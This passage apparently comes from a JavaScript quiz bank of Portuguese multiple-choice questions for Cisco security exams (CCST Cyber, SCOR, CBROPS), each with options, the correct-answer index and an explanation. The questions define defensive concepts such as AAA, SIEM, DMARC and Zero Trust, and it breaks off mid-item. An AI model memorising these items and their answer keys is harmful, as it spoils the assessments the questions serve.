window.QUIZ_BANK = [
  {
    "question": "Na tríade CIA da segurança da informação, o que representa a Confidentiality (Confidencialidade)?",
    "options": [
      "Garantir que os sistemas estão sempre disponíveis para utilizadores autorizados, mesmo em falha de hardware",
      "Garantir que só entidades autorizadas acedem à informação, tipicamente com controlos de acesso e encriptação",
      "Garantir que os dados não são alterados sem deteção, por exemplo com hashes criptográficos e assinaturas",
      "Garantir que o tráfego de rede usa sempre a porta TCP 443, mesmo em redes internas isoladas da Internet"
    ],
    "correct": 1,
    "explanation": "A tríade CIA é Confidentiality, Integrity e Availability. Confidencialidade protege o acesso à informação (quem pode ver); Integridade protege contra alterações não autorizadas; Disponibilidade assegura acesso quando necessário.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "1.1"
  },
  {
    "question": "Um email pede-lhe urgentemente para clicar num link e «validar a conta Cisco» introduzindo a password. Que tipo de ataque de engenharia social é este?",
    "options": [
      "Phishing (ou spear phishing se for direcionado)",
      "Ataque de força bruta contra o servidor RADIUS",
      "Man-in-the-middle exclusivamente na camada física",
      "DDoS por amplificação DNS"
    ],
    "correct": 0,
    "explanation": "Phishing usa mensagens fraudulentas para induzir a vítima a revelar credenciais ou instalar malware. Spear phishing é a variante altamente personalizada. Não é força bruta, MITM físico nem DDoS.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Qual é a diferença principal entre um firewall de filtragem de pacotes e um sistema IDS/IPS?",
    "options": [
      "Um firewall só analisa malware em anexos de email SMTP; o IDS/IPS limita-se a fazer NAT entre endereços privados e públicos",
      "O firewall e o IDS executam exatamente a mesma função; o IPS é apenas a marca comercial da Cisco para esse tipo de equipamento",
      "O firewall aplica política de permitir/negar tráfego; o IDS deteta anomalias/assinaturas (alerta) e o IPS pode bloquear em linha",
      "O IDS substitui completamente o AAA (Authentication, Authorization, Accounting) no controlo de identidade dos utilizadores"
    ],
    "correct": 2,
    "explanation": "Firewalls controlam o que passa segundo regras. IDS (Intrusion Detection) monitoriza e alerta; IPS (Intrusion Prevention) atua em linha e pode descartar tráfego malicioso. São complementares, não substitutos de AAA.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "firewall-vpn",
    "domain": "2.5"
  },
  {
    "question": "No modelo AAA usado em redes Cisco, o que significam Authentication, Authorization e Accounting?",
    "options": [
      "Apenas a encriptação de ligações VPN site-to-site com IPsec, sem identificar quem é o utilizador",
      "Apenas o balanceamento de carga entre controladores wireless, sem autorizar o que cada sessão pode fazer",
      "Apenas o inventário automático de switches na LAN, sem registar que utilizador acedeu nem o que fez",
      "Autenticar quem é o utilizador/dispositivo, autorizar o que pode fazer, e registar (accounting) o que fez"
    ],
    "correct": 3,
    "explanation": "AAA: Authentication verifica identidade; Authorization define permissões/políticas; Accounting regista sessões e uso (útil para auditoria e faturação). Protocolos comuns: RADIUS e TACACS+.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "identidade",
    "domain": "1.3"
  },
  {
    "question": "Em VPNs, qual afirmação descreve melhor IPsec em comparação com SSL/TLS VPN (ex.: acesso remoto via browser ou AnyConnect em modo SSL)?",
    "options": [
      "IPsec opera tipicamente nas camadas de rede (protege pacotes IP) e é comum em site-to-site; SSL VPN trabalha sobretudo na sessão/transporte e é popular para acesso remoto de utilizadores",
      "IPsec só funciona em IPv6 e recusa pacotes IPv4 no router; a SSL VPN só funciona em IPv4 e não estabelece qualquer sessão de acesso remoto quando o cliente usa apenas IPv6",
      "A SSL VPN substitui sempre o routing OSPF no núcleo da rede, retirando as adjacências OSPF e passando a encaminhar todo o tráfego interno do campus apenas por túneis TLS",
      "IPsec e a SSL VPN são exatamente o mesmo protocolo com nomes diferentes, com os mesmos cabeçalhos ESP, a mesma porta de transporte e a mesma negociação IKE de chaves"
    ],
    "correct": 0,
    "explanation": "IPsec (AH/ESP, IKE) protege tráfego IP e é clássico em VPNs site-to-site. SSL/TLS VPNs encapsulam sessões de utilizador e são comuns em remote access. Ambos podem coexistir conforme o caso de uso.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "1.6"
  },
  {
    "question": "Qual descrição corresponde corretamente a ransomware?",
    "options": [
      "Malware que cifra ficheiros da vítima e exige pagamento (resgate) para devolver o acesso",
      "Um protocolo proprietário da Cisco usado apenas para sincronizar relógios NTP internos",
      "Uma ACL estendida que permite apenas tráfego HTTPS e bloqueia todo o restante da rede",
      "Um tipo de cabo de fibra óptica multimodo usado em ligações curtas dentro do edifício"
    ],
    "correct": 0,
    "explanation": "Ransomware encripta dados e pede resgate. Outros tipos: vírus, worms, trojans, spyware, rootkits. Mitigações: backups offline, patching, MFA, filtragem de email e least privilege.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "O que é Zero Trust, em termos de princípios de segurança de rede?",
    "options": [
      "Confiar automaticamente em qualquer dispositivo que esteja dentro da LAN corporativa, sem nova verificação de identidade",
      "Desligar todos os firewalls de perímetro porque a cloud do fornecedor já é tratada como segura por predefinição, sem inspeção",
      "Nunca confiar por predefinição: verificar continuamente identidade, contexto e postura antes de conceder acesso mínimo necessário",
      "Usar apenas passwords partilhadas nos switches de acesso da LAN, sem autenticação individual de cada utilizador ou porta"
    ],
    "correct": 2,
    "explanation": "Zero Trust assume que a rede interna não é zona de confiança automática. Exige autenticação forte, autorização contextual, microsegmentação e verificação contínua (nunca trust, always verify).",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "1.8"
  },
  {
    "question": "No ecossistema Cisco de segurança, qual o papel típico do Cisco ISE (Identity Services Engine) face a uma plataforma de XDR/visão unificada como SecureX (ou sucessoras)?",
    "options": [
      "O ISE substitui completamente o routing BGP na Internet, anunciando os prefixos públicos e as rotas externas no lugar dos routers de fronteira da própria organização",
      "O ISE foca-se em identidade, controlo de acesso (802.1X, guest, posture) e policy; plataformas tipo SecureX agregam telemetria e orquestram resposta entre produtos",
      "O SecureX é apenas um cabo de consola série ligado à porta de consola do router; o ISE é só um tema de wallpaper decorativo no ecrã inicial do equipamento",
      "Ambos servem exclusivamente para configurar VLANs de acesso em switches não geridos, sem qualquer função de identidade, de posture ou de orquestração"
    ],
    "correct": 1,
    "explanation": "Cisco ISE é o cérebro de AAA/policy NAC (802.1X, profiling, posture, guest). SecureX (e evoluções) integra alertas e workflows entre firewall, endpoint, email, etc. São complementares na arquitetura de segurança Cisco.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.1"
  },
  {
    "question": "Qual é a diferença fundamental entre hashing e encriptação simétrica?",
    "options": [
      "Hashing e encriptação são sempre o mesmo algoritmo AES-256, com a mesma chave secreta e o mesmo resultado reversível nos dois casos",
      "A encriptação só funciona em texto escrito em português; o hashing só produz um resultado válido quando o texto original está em inglês",
      "O hashing aumenta sempre o tamanho dos dados de origem em cada bloco; a encriptação simétrica reduz sempre a mensagem para exatamente 128 bits",
      "Hashing é tipicamente unidirecional (integridade/verificação); encriptação simétrica é reversível com a chave partilhada (confidencialidade)"
    ],
    "correct": 3,
    "explanation": "Hashes (SHA-256, etc.) não se «desfazem» para recuperar o original — servem para integridade e verificação. Encriptação simétrica (AES) cifra e decifra com a mesma chave. Assimétrico usa pares de chaves pública/privada.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "cripto",
    "domain": "1.4"
  },
  {
    "question": "Porque é que a autenticação multifator (MFA) reduz significativamente o risco de compromisso de contas?",
    "options": [
      "Porque elimina por completo a necessidade de patches de segurança no sistema operativo, deixando as falhas do software sem correção",
      "Porque torna o Wi-Fi automaticamente WPA3 sem qualquer configuração, mesmo em pontos de acesso antigos que só suportam WPA2",
      "Porque substitui os firewalls perimetrais em todos os cenários, dispensando as regras de filtragem na fronteira da rede",
      "Porque exige algo mais do que só a password (ex.: app OTP, token, biometria), dificultando o uso de credenciais roubadas"
    ],
    "correct": 3,
    "explanation": "MFA combina fatores (conhecimento, posse, inerência). Mesmo com password vazada, o atacante precisa do segundo fator. É controlo essencial em Zero Trust e em acesso administrativo Cisco (e não substitui patching nem firewalls).",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "identidade",
    "domain": "1.3"
  },
  {
    "question": "O que é defense in depth (defesa em profundidade) num ambiente de rede?",
    "options": [
      "Usar uma única password complexa para todos os dispositivos, partilhada entre os routers, os switches e os firewalls da rede local",
      "Confiar apenas num antivirus no endpoint e remover a segmentação, deixando a LAN interna como uma única zona de confiança",
      "Aplicar várias camadas de controlos (perímetro, rede, identidade, endpoint, dados) para que a falha de um não comprometa tudo",
      "Desativar os logs de segurança para melhorar a performance do equipamento, sem registar tentativas de acesso nem alterações"
    ],
    "correct": 2,
    "explanation": "Defense in depth sobrepõe controlos complementares: firewalls, segmentação, AAA/MFA, EDR, encriptação, monitorização. Reduz o impacto de uma única falha.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "1.1"
  },
  {
    "question": "Qual o benefício principal da segmentação de rede (ex.: VLANs, firewalls entre zonas) para a cibersegurança?",
    "options": [
      "Aumentar o broadcast domain de cada VLAN para que o malware se propague mais depressa entre hosts da mesma zona e das zonas vizinhas",
      "Eliminar a necessidade de atualizar o firmware dos switches, firewalls e routers, tratando a segmentação como substituto dos patches",
      "Permitir que convidados usem a mesma VLAN de gestão dos routers e firewalls, com acesso direto aos endereços IP de administração",
      "Limitar movimento lateral: um compromisso numa zona não tem acesso automático a servidores críticos noutra zona"
    ],
    "correct": 3,
    "explanation": "Segmentação (e microsegmentação) restringe east-west traffic. Isola IoT/guest da gestão e de data centers, alinhado com Zero Trust e least privilege.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.2"
  },
  {
    "question": "Qual é o objetivo principal de uma plataforma SIEM (Security Information and Event Management)?",
    "options": [
      "Substituir todos os agentes antivírus de endpoint por um único packet broker no switch core, que passa a analisar os ficheiros maliciosos no host",
      "Emitir certificados TLS públicos para servidores internos sem uma CA privada, assinando os nomes internos como se fosse uma autoridade pública",
      "Recolher e correlacionar logs/eventos de muitas fontes, detetar padrões suspeitos e apoiar alertas e investigação",
      "Garantir zero falsos positivos bloqueando todas as consultas DNS de saída, para que nenhum nome externo seja resolvido pelos clientes"
    ],
    "correct": 2,
    "explanation": "Um SIEM agrega logs e eventos de segurança (firewalls, endpoints, identidade, cloud, etc.), normaliza e correlaciona-os, e ajuda analistas a detetar, alertar e investigar incidentes. Não substitui AV por um packet broker, não funciona como CA pública de TLS, e não promete zero falsos positivos ao bloquear DNS às cegas.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.1"
  },
  {
    "question": "Em cibersegurança, para que se usa principalmente o framework MITRE ATT&CK?",
    "options": [
      "Um guia de sintaxe CLI específico de fabricante para configurar access lists no ASA, com os comandos access-list e access-group, a ordem das ACEs e o implicit deny no fim de cada ACL",
      "Uma base de conhecimento de táticas e técnicas de adversários (e procedimentos relacionados) usada para mapear deteções, planear defesas e falar de ameaças numa linguagem comum",
      "Um algoritmo de encriptação obrigatório que substitui o AES em todos os handshakes TLS 1.3, forçando uma única cifra simétrica em cada ClientHello e recusando as outras suites negociadas",
      "Uma norma de layout físico de racks para densidade de cablagem em data centers, que fixa a altura em U, as calhas verticais e o espaçamento dos patch panels de cobre e de fibra"
    ],
    "correct": 1,
    "explanation": "O MITRE ATT&CK cataloga táticas (o «porquê») e técnicas (o «como») de adversários no mundo real, muitas vezes com exemplos de procedimentos. Os defensores usam-no para analisar falhas de cobertura, escrever deteções e discutir incidentes de forma consistente. Não é documentação CLI do ASA, não é uma cifra que substitui o AES, e não é uma norma de cablagem.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.2"
  },
  {
    "question": "Contra o que é que um Web Application Firewall (WAF) protege principalmente?",
    "options": [
      "Ataques à camada de aplicação contra apps HTTP/HTTPS (por exemplo SQLi, XSS e abuso de URLs ou APIs vulneráveis), inspecionando e filtrando pedidos web",
      "Cortes de cabo Layer 1 entre o switch de acesso e o PC do utilizador, quando o par de cobre ou a fibra perde continuidade e o link Ethernet fica sem sinal na tomada",
      "Esgotamento de memória da LSDB OSPF nos routers core causado por demasiados LSAs Type 5 de rotas externas redistribuídas a partir de outros protocolos",
      "Falha da bateria de um UPS que alimenta os wireless controllers, deixando os access points sem energia durante um corte elétrico no bastidor"
    ],
    "correct": 0,
    "explanation": "Um WAF fica à frente de aplicações web e inspeciona tráfego HTTP/S para bloquear ou desafiar ataques comuns à camada de aplicação, como SQL injection, cross-site scripting e padrões de pedido conhecidos como maus. Não resolve cortes físicos de cabo, dimensionamento da LSDB OSPF, nem baterias de UPS.",
    "difficulty": "Fácil",
    "exam": "scor",
    "topic": "firewall-vpn",
    "domain": "1.2"
  },
  {
    "question": "Qual é o objetivo principal do DNSSEC?",
    "options": [
      "Encriptar cada consulta DNS para que o resolver recursivo nunca veja o nome pedido (isso é DNS over TLS ou DNS over HTTPS, não DNSSEC) e o QNAME fique oculto no trajeto de rede",
      "Substituir o SPF para que os servidores de correio deixem de verificar que hosts podem enviar pelo domínio, ignorando o registo TXT e aceitando qualquer MTA",
      "Assinar digitalmente os dados DNS para que os resolvers validadores detetem respostas forjadas ou alteradas (autenticidade e integridade), sem esconder a própria consulta",
      "Bloquear automaticamente todas as transferências de malware no endpoint, apagando o ficheiro descarregado antes de qualquer processo o conseguir executar"
    ],
    "correct": 2,
    "explanation": "O DNSSEC acrescenta assinaturas digitais (registos RRSIG e DNSKEY, encadeados com DS no pai) para um resolver validador confirmar que os dados vieram da zona autoritativa e não foram modificados. A confidencialidade da consulta vem de DoT ou DoH, não do DNSSEC. Não substitui a autenticação de email nem a proteção de endpoint.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "cripto",
    "domain": "1.5"
  },
  {
    "question": "Em conjunto, o que fazem SPF, DKIM e DMARC na segurança do correio eletrónico?",
    "options": [
      "Encriptam o corpo da mensagem de ponta a ponta para só o destinatário a poder ler (isso é S/MIME ou PGP), cifrando o conteúdo com a chave pública do destinatário antes da submissão de correio ao MTA",
      "O SPF indica que servidores podem enviar em nome do domínio, o DKIM assina criptograficamente a mensagem e o DMARC diz aos recetores o que fazer quando essas verificações falham e como reportar",
      "Analisam anexos à procura de ransomware dentro do MTA, abrindo cada parte MIME e bloqueando a entrega quando a assinatura do payload coincide com malware conhecido",
      "Substituem o TLS na submissão SMTP (porta 587), dispensando o STARTTLS e o certificado porque a política publicada do domínio autentica sozinha o canal com o relay"
    ],
    "correct": 1,
    "explanation": "O SPF autoriza hosts de envio num registo TXT de DNS. O DKIM assina cabeçalhos selecionados e o corpo com uma chave do domínio publicada em DNS. O DMARC exige que o domínio visível do From alinhe com SPF e/ou DKIM e publica uma política (none, quarantine ou reject) mais relatórios. Em conjunto combatem a falsificação do domínio; não encriptam a mensagem nem substituem o TLS do SMTP.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "ameacas",
    "domain": "5.7"
  },
  {
    "question": "Qual é a diferença principal entre EDR e XDR?",
    "options": [
      "O EDR só encripta discos com uma chave de volume no endpoint; o XDR só configura VLANs de acesso nos switches, sem recolher telemetria de processos, ficheiros ou comportamento do host nem cruzar alertas de outras ferramentas de segurança",
      "São o mesmo produto; XDR é apenas o nome Cisco do mesmo ficheiro de assinaturas de antivírus que o EDR aplica no host, sem correlacionar telemetria de rede, de email, de identidade ou de cloud numa única consola",
      "O EDR substitui o firewall de perímetro na filtragem de tráfego; o XDR substitui o DNS recursivo na resolução de nomes, respondendo ele próprio às consultas A e AAAA feitas pelos clientes internos em vez do resolver",
      "O EDR foca telemetria e resposta no endpoint (processos, ficheiros e comportamento no host); o XDR correlaciona isso com outras fontes (rede, email, identidade, cloud) para uma visão mais ampla de deteção e resposta"
    ],
    "correct": 3,
    "explanation": "EDR (Endpoint Detection and Response) recolhe telemetria e apoia a resposta nos endpoints. XDR (Extended Detection and Response) alarga a deteção e a resposta a vários pontos de controlo, correlacionando o endpoint com rede, email, cloud e identidade. O Cisco XDR é um exemplo deste modelo mais largo. Nenhum dos dois substitui, por si, o firewall ou a encriptação de disco.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "endpoint",
    "domain": "5.1"
  },
  {
    "question": "Para que serve principalmente uma plataforma SOAR?",
    "options": [
      "Security Orchestration, Automation and Response: playbooks que automatizam e coordenam a resposta entre ferramentas (tickets, bloqueios na firewall e enriquecimento)",
      "Um protocolo de routing que substitui o OSPF no data center, trocando LSAs entre spines e leaves para calcular o caminho mais curto e instalá-lo no RIB do fabric local",
      "Um cofre físico para guardar passwords de firewalls, com fechadura mecânica, registo em papel e selo no bastidor das consolas de gestão",
      "Uma norma que obriga a espelhar todos os pacotes para uma única porta SPAN no switch de agregação do campus, sem qualquer filtro de captura"
    ],
    "correct": 0,
    "explanation": "SOAR (orquestração, automação e resposta) executa playbooks: enriquecer alertas, abrir casos, isolar hosts, bloquear indicadores e notificar equipas. Complementa o SIEM, que deteta e guarda eventos, em vez de substituir routing ou SPAN.",
    "difficulty": "Fácil",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "1.2"
  },
  {
    "question": "Numa equipa de operações de segurança, o que é threat hunting?",
    "options": [
      "Esperar apenas por alertas SIEM de severidade alta e fechá-los sem procurar atividade relacionada no endpoint, na rede ou nos registos de identidade durante a mesma janela temporal",
      "Desligar os logs de firewall, de endpoint e de DNS para o atacante não perceber que foi detetado, apagando a telemetria no coletor antes de qualquer consulta feita pelo analista de SOC",
      "Uma procura proativa na telemetria por atividade de adversário que as deteções automáticas possam ter falhado, muitas vezes guiada por uma hipótese e por frameworks como o MITRE ATT&CK",
      "Substituir todos os controlos preventivos (firewall, MFA, patches) por uma revisão manual semanal de logs, sem filtrar tráfego, sem exigir um segundo fator e sem aplicar as correções"
    ],
    "correct": 2,
    "explanation": "Threat hunting parte do princípio de que algumas intrusões escapam aos alertas. O hunter formula uma hipótese (por exemplo uma técnica do ATT&CK), consulta dados de endpoint, rede ou identidade, e transforma achados em novas deteções. Complementa SIEM e EDR; não substitui a prevenção nem significa ignorar alertas.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "1.3"
  },
  {
    "question": "Qual é a principal diferença entre um Indicator of Compromise (IoC) e um Indicator of Attack (IoA)?",
    "options": [
      "Os IoCs só se usam em crachás de segurança física e inventários de leitores de porta no átrio, enquanto os IoAs só se usam em site surveys wireless e mapas de calor de RF para posicionar access points na planta",
      "Um IoC é tipicamente um artefacto forense que sugere que já houve compromisso (hash, IP, domínio, caminho de ficheiro), ao passo que um IoA foca comportamentos/TTPs que mostram um ataque em curso — mesmo antes de aparecerem IoCs clássicos",
      "Os IoAs substituem identificadores CVE nas bases públicas de vulnerabilidades, enquanto os IoCs substituem as pontuações de gravidade CVSS que as equipas de patches usam para priorizar a remediação semanal",
      "Não há diferença: os vendors usam os dois termos de forma intercambiável para a mesma entrada de ACL numa firewall que bloqueia um único IP malicioso conhecido ou um domínio malicioso"
    ],
    "correct": 1,
    "explanation": "Os IoCs são artefactos observáveis ligados a atividade maliciosa conhecida após ou durante o compromisso (hashes de malware, IPs/domínios de C2, nomes de ficheiro). Os IoAs enfatizam comportamentos e técnicas do atacante (ex.: PowerShell invulgar, padrões de credential dumping) para detetar atividade mais cedo e de forma mais resiliente quando a infraestrutura muda. Não são conceitos de crachá/wireless, não substituem CVE/CVSS, e não são sinónimos de linhas de ACL.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "3.3"
  },
  {
    "question": "Num cenário de compromisso, o que significa normalmente “movimento lateral” (lateral movement)?",
    "options": [
      "Deslocar fisicamente os racks do data center na fila para melhorar o fluxo de ar de refrigeração após um incidente, sem mudar hosts comprometidos, contas ou caminhos internos",
      "Rodar certificados VPN de hora a hora para os utilizadores remotos se reautenticarem continuamente, mesmo quando nenhum host da rede interna foi comprometido por um atacante",
      "Após o acesso inicial, o atacante pivota do primeiro host comprometido para outros sistemas/contas dentro da rede para expandir o controlo e alcançar alvos de alto valor",
      "Fazer failover automático do tráfego do ISP primário para um circuito de backup quando o BGP retira um prefixo, o que é um evento de routing e não um passo de uma intrusão"
    ],
    "correct": 2,
    "explanation": "O movimento lateral é a fase pós-compromisso em que o adversário salta entre hosts e escala ou reutiliza credenciais (RDP, SMB, Pass-the-Hash, ferramentas de gestão remota, etc.) para alargar a posição e chegar aos “crown jewels”. Não é relocação física de racks, política isolada de rotação de certificados, nem failover de ISP.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Para que serve principalmente um CASB (Cloud Access Security Broker)?",
    "options": [
      "Ficar entre utilizadores e serviços cloud para aplicar política de segurança — visibilidade, conformidade, proteção de dados e defesa contra ameaças no uso de SaaS/IaaS (incluindo shadow IT)",
      "Substituir o switch de core corporativo por um fabric apenas de Layer 2 gerido na cloud que não pode correr OSPF, BGP nem outro protocolo de routing entre os bastidores",
      "Gerar pontuações de gravidade CVSS automaticamente só a partir de amostras NetFlow, sem base de vulnerabilidades, inventário de ativos ou resultados de um scanner",
      "Terminar todos os labels MPLS no CASB para os routers de branch deixarem de precisar de um provider edge e poderem abandonar as sessões de LDP ou segment routing"
    ],
    "correct": 0,
    "explanation": "Um Cloud Access Security Broker é um ponto de controlo (baseado em API, proxy reverso/forward, ou ambos) que aplica política de segurança empresarial ao uso de apps cloud: descobrir shadow IT, impor DLP/controlos de acesso e detetar ameaças em contextos SaaS/IaaS. Não substitui o switch de core, não é um motor CVSS alimentado só por NetFlow, e não substitui um PE MPLS.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "3.3"
  },
  {
    "question": "Em que é que o Business Email Compromise (BEC) difere tipicamente do phishing em massa clássico?",
    "options": [
      "O BEC depende sempre de exploits zero-day de browser em drive-by downloads, enquanto as campanhas de phishing só usam mensagens SMS",
      "O BEC é uma família de ransomware que encripta caixas de correio corporativas para pagamento, enquanto o phishing só rouba PSKs Wi-Fi de routers domésticos",
      "O BEC é fraude de engenharia social dirigida (muitas vezes falsos executivos/fornecedores) para desviar dinheiro ou dados, não um isco amplo de credenciais",
      "O BEC só tem sucesso contra caixas Gmail pessoais de consumo, enquanto o phishing só tem sucesso contra prompts de password do Active Directory corporativo"
    ],
    "correct": 2,
    "explanation": "O BEC é tipicamente uma fraude focada: os atacantes impersonam um CEO, responsável financeiro ou fornecedor de confiança e empurram uma transferência ou alteração de dados, muitas vezes sem malware. O phishing clássico lança uma rede larga para roubar passwords ou entregar payloads. O BEC não se define como só zero-day, ransomware de mailboxes, nem limitado a Gmail vs AD.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "ameacas",
    "domain": "2.7"
  },
  {
    "question": "Qual é o objetivo principal dos controlos de Data Loss Prevention (DLP)?",
    "options": [
      "Retirar por completo as firewalls de perímetro para que só os motores de antivírus de endpoint inspecionem e permitam todo o tráfego de aplicações de saída dos portáteis",
      "Detetar e impedir que dados sensíveis saiam de canais aprovados sem autorização",
      "Encriptar em ZIP todas as partilhas de ficheiros departamentais de noite para as janelas de backup terminarem mais depressa em tape ou object storage",
      "Dar a cada utilizador um MAC aleatório novo no login para os switches Layer-2 do campus não seguirem dispositivos entre edifícios"
    ],
    "correct": 1,
    "explanation": "As políticas DLP identificam conteúdo sensível e aplicam regras em email, web, endpoints ou apps cloud para dados regulados ou secretos não serem exfiltrados à toa. Complementam — não substituem — firewalls e AV. Não são compressão de backup nem randomização diária de MAC.",
    "difficulty": "Fácil",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "4.4"
  },
  {
    "question": "Em que é que o Network Detection and Response (NDR) se foca principalmente?",
    "options": [
      "Apenas a varrer portáteis uma vez por mês à procura de patches de segurança Windows em falta e abrir tickets ITSM",
      "Apenas a gerir tickets de alteração de firewall numa fila ITSM sem nunca inspecionar pacotes, flows ou metadados de sessão",
      "Apenas a forçar DoH ou DoT para resolvers DNS recursivos nunca observarem nomes de query em claro dos clientes corporativos",
      "Analisar tráfego/metadados de rede (muitas vezes também east-west) para detetar ameaças e apoiar a resposta"
    ],
    "correct": 3,
    "explanation": "Ferramentas NDR observam o comportamento da rede — flows, sessões, por vezes pacotes — para detetar C2, movimento lateral e anomalias, e ajudar os analistas a responder. É mais amplo do que scans mensais de patches, só higiene de tickets ITSM, ou encriptação DNS (DoH/DoT), que são controlos diferentes.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "4.1"
  },
  {
    "question": "O que procura principalmente o UEBA (User and Entity Behavior Analytics)?",
    "options": [
      "Só a pontuação CVSS base exata de cada CVE publicado nesse dia civil, ignorando como as contas se comportam de facto em produção",
      "Desvios face a linhas de base normais de utilizadores e entidades que podem sinalizar compromisso ou abuso interno",
      "Substituir todas as ACL de firewall por um único permit any-any para a análise nunca observar fluxos bloqueados na edge",
      "Encriptar todo o syslog com uma chave pré-partilhada estática e descartar todo o contexto de identidade vindo do SSO"
    ],
    "correct": 1,
    "explanation": "O UEBA constrói linhas de base comportamentais de utilizadores e entidades (hosts, contas de serviço) e assinala atividade anómala que pode indicar takeover de conta, ameaça interna ou movimento lateral. Não é um feed de pontuação CVE, nem desculpa para abrir firewalls a any-any, nem descartar contexto de identidade nos logs.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "logs-ir",
    "domain": "1.11"
  },
  {
    "question": "O que é “shadow IT” no contexto de segurança empresarial?",
    "options": [
      "O inventário oficial CMDB de cada rack aprovado no data center mais os números de série Cisco TAC guardados para auditorias",
      "Um exercício tabletop trimestral obrigatório que só testa leitores de crachá físicos nos torniquetes da receção em drills",
      "Unidades de negócio a adotarem apps ou cloud não sancionados fora da governação de TI",
      "Um caminho de fibra escura de failover usado só pelos switches de core em janelas de manutenção noturna aos fins de semana"
    ],
    "correct": 2,
    "explanation": "Shadow IT é o uso de aplicações, SaaS ou infraestrutura sem aprovação de TI/segurança—criando falhas de visibilidade, conformidade e fuga de dados. Não é o CMDB oficial, nem um exercício de crachás na receção, nem uma fibra escura de manutenção.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "3.3"
  },
  {
    "question": "O que procura alcançar um ataque de MFA fatigue (MFA bombing)?",
    "options": [
      "Substituir todos os concentradores VPN corporativos por um SSID guest aberto sem portal cativo, sem WPA e sem registo de associações na edge",
      "Fazer downgrade de todas as sessões TLS da Internet para HTTP em claro inundando só com ICMP echo contra cada resolver recursivo da quinta DNS do campus",
      "Inundar o utilizador com prompts push/OTP até aprovar um por irritação, dando ao atacante uma sessão",
      "Apagar todas as communities BGP em todos os routers de edge de noite para as tags de engenharia de tráfego nunca mais poderem ser usadas por route-maps em produção"
    ],
    "correct": 2,
    "explanation": "MFA fatigue/bombing sobrecarrega o utilizador legítimo com prompts de autenticação até aceitar um, entregando ao atacante uma sessão autenticada após roubo de credenciais ou password spray. Não é o mecanismo de SSID guest aberto, downgrade TLS só com ICMP, nem limpar communities BGP.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "identidade",
    "domain": "6.7"
  },
  {
    "question": "O que significa um container escape básico num host com workloads Docker/Kubernetes?",
    "options": [
      "O processo do contentor só perde o endereço IPv4 e tem de renovar DHCP no eth0, sem alterar de todo as fronteiras de isolamento nem privilégios no host",
      "Atacante/malware quebra o isolamento do contentor e pode afetar o host ou contentores irmãos",
      "O Kubernetes converte sempre cada Pod numa VM Type-1 completa que não pode partilhar o kernel com o nó worker sob qualquer plugin CNI",
      "O escape só renomeia a interface bridge Docker para VLAN 1 e desativa automaticamente todos os objetos NetworkPolicy do cluster sem verificações RBAC"
    ],
    "correct": 1,
    "explanation": "Um container escape ocorre quando código dentro do contentor quebra o isolamento (namespaces/cgroups/capabilities/má config) e alcança o SO do host ou workloads irmãos. Não é uma renovação DHCP inofensiva, nem a afirmação de que cada Pod vira VM Type-1, nem só renomear a bridge Docker.",
    "difficulty": "Médio",
    "exam": "scor",
    "topic": "rede-cloud",
    "domain": "3.7"
  },
  {
    "question": "Que problema procura reduzir principalmente o certificate pinning (public-key pinning) numa app móvel ou cliente thick?",
    "options": [
      "Força todas as portas de switch de acesso para err-disabled sempre que um utilizador instala uma CA raiz corporativa no portátil para correio ou VPN",
      "Substitui totalmente o DNS empresarial por ficheiros /etc/hosts estáticos em cada endpoint para as apps nunca mais resolverem nomes via resolvers recursivos",
      "Guarda a password reutilizável do utilizador no campo CN do certificado leaf para nunca serem necessários prompts MFA após o primeiro login",
      "Limita que certs/chaves de servidor a app aceita, reduzindo algum MITM TLS com CAs inesperadas"
    ],
    "correct": 3,
    "explanation": "Certificate pinning (ou public-key pinning) ensina o cliente a esperar um certificado ou chave específicos (ou um conjunto pequeno), para um proxy TLS com outro certificado assinado por outra CA ter mais probabilidade de falhar. Não põe portas em err-disabled, não substitui DNS por hosts, nem embute passwords no CN.",
    "difficulty": "Médio",
    "exam": "cbrops",
    "topic": "cripto",
    "domain": "2.10"
  },
  {
    "question": "O que a microsegmentação pretende controlar sobretudo no tráfego east-west dentro de um data center ou VPC cloud?",
    "options": [
      "Substituir todas as firewalls de bordo por um único switch hub para todos os tenants partilharem uma VLAN plana e um único default gateway para sempre",
      "Limitar movimento lateral com regras allow finas entre workloads, não só no perímetro north-south",
      "Desligar toda a cifra entre VMs para os packet brokers espelharem todos os fluxos east-west sem licenças de inspeção TLS",
